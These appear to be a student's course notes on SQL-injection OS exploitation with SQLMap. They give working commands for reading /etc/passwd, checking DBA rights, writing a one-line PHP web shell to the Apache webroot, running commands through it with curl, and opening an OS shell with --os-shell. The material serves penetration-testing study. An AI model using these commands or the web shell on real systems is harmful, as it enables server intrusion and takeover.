# File Read/Write
---
- The first part of OS Exploitation through an SQL Injection vulnerability is reading and writing data on the hosting server. 
- **==Reading data is much more common than writing data,==** which is **strictly privileged in modern DBMSes, as it can lead to system exploitation,** as we will see. 
- For example, in **==MySql, to read local files, the DB user must have the privilege to LOAD DATA and INSERT, to be able to load the content of a file to a table and then reading that table.==**
- An example of such a command is:
    LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE passwd;
- While we do not necessarily need to have database administrator privileges (DBA) to read data, this is becoming more common in modern DBMSes. The same applies to other common databases. Still, ==**if we do have DBA privileges, then it is much more probable that we have file-read privileges.**==

# Checking for DBA Privileges
---
- To check whether we have DBA privileges with SQLMap, we **can use the `--is-dba` option:**
	- `sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba`
	- ![[Pasted image 20251027071048.png]]
- As we can see, if we test that on one of the previous exercises, **we get `current user is DBA: False`, meaning that we do not have DBA access.** 

## Reading Local Files
---
- Instead of manually injecting the above line through SQLi, **SQLMap makes it relatively easy to read local files with the `--file-read` option:**
	- `sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"`
	- ![[Pasted image 20251027071137.png]]
- As we can see, SQLMap said **`files saved` to a local file**. **We can `cat` the local file to see its content:**
	- `cat ~/.sqlmap/output/www.example.com/files/_etc_passwd`

# Writing Local Files
---
- When it comes to writing files to the hosting server, ==**it becomes much more restricted in modern DMBSes, since we can utilize this to write a Web Shell on the remote server**==, and hence get code execution and take over the server.
- This is why **modern DBMSes disable file-write by default and need certain privileges** for DBA's to be able to write files.
- For example, in MySql, **==the `--secure-file-priv` configuration must be manually disabled to allow writing data into local files using the `INTO OUTFILE` SQL query,==** in addition to any local access needed on the host server, like the privilege to write in the directory we need.
- Still, **many web applications require the ability for DBMSes to write data into files**, so it is **worth testing** whether we can write files to the remote server.
- To do that with SQLMap, **we can use the `--file-write` and `--file-dest` options**. First, let's prepare a basic PHP web shell and write it into a `shell.php` file:
	- `echo '<?php system($_GET["cmd"]); ?>' > shell.php`
- Now, let's attempt to write this file on the remote server, in the **`/var/www/html/` directory, the default server webroot for Apache.**
	- `sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`

- `[17:54:28] [INFO] the local file 'shell.php' and the remote file '/var/www/html/shell.php' have the same size (31 B)`
- Now, we can attempt to access the remote PHP shell, and execute a sample command:
	- `curl http://www.example.com/shell.php?cmd=ls+-la`
	- ![[Pasted image 20251027071349.png]]
# OS Command Execution
---
- Now that we confirmed that we could write a PHP shell to get command execution, ==**we can test SQLMap's ability to give us an easy OS shell without manually writing a remote shell**==. 
- SQLMap utilizes various techniques to get a remote shell through SQL injection vulnerabilities, l**ike writing a remote shell, as we just did, writing SQL functions that execute commands and retrieve output or even using some SQL queries that directly execute OS command, like `xp_cmdshell`** in Microsoft SQL Server. 
- To get an OS shell with SQLMap, we can use the `--os-shell` option, as follows:
	- `sqlmap -u "http://www.example.com/?id=1" --os-shell`
- We see that SQLMap defaulted to `UNION` technique to get an OS shell, but **eventually failed to give us any output `No output`**.
	- ![[Pasted image 20251027071505.png]]
- Let's **==try to specify another technique that has a better chance of giving us direct output, like the `Error-based SQL Injection`, which we can specify with `--technique=E`:==**
	- `sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E`
	- ![[Pasted image 20251027071545.png]]
	- ![[Pasted image 20251027071603.png]]

- **Note**: SQLMap **first asked us for the type of language used on this remote server, which we know is PHP**. 
- Then it **asked us for the server web root directory, and we asked SQLMap to automatically find it using 'common location(s)'.** 
- Both of these **options are the default options, and would have been automatically chosen if we added the '--batch' option to SQLMap.**